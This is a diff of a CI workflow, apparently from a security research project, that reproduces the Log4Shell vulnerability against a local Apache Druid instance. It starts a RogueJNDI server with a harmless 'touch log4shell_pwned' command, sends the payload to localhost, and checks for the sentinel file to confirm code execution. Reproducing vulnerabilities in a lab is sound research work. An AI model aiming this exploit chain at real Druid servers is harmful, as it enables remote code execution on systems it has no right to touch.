@@ -127,7 +127,7 @@ jobs:
       - name: Start Druid (nano-quickstart, background)
         run: |
           cd "apache-druid-${DRUID_VERSION}"
-          ./bin/start-nano-quickstart > /tmp/druid.log 2>&1 &
+          bin/supervise -c conf/supervise/single-server/nano-quickstart.conf > /tmp/druid.log 2>&1 &
           echo "Waiting for Druid router to be ready …"
           for i in $(seq 1 90); do
             if curl -sf http://localhost:8888/status > /dev/null 2>&1; then
@@ -148,11 +148,8 @@ jobs:
           # Use loopback; Druid runs on the same host so it can reach the HTTP server.
           java -jar rq1/rogue-jndi-server/target/RogueJndi-1.1.jar \
             --command "touch log4shell_pwned" \
-            --hostname 127.0.0.1 \
-            > rogue-jndi.log 2>&1 &
+            --hostname 127.0.0.1 &
           sleep 3
-          echo "RogueJNDI log:"
-          cat rogue-jndi.log
 
       - name: Send Log4Shell payload to Druid
         run: python3 rq1/trigger_log4shell.py --host http://localhost:8888
@@ -162,9 +159,6 @@ jobs:
 
       - name: Confirm RCE — check sentinel file
         run: |
-          echo "=== RogueJNDI log ==="
-          cat rogue-jndi.log
-          echo ""
           if [ -f log4shell_pwned ]; then
             ls -l .
             echo "✓ RCE CONFIRMED: log4shell_pwned exists"
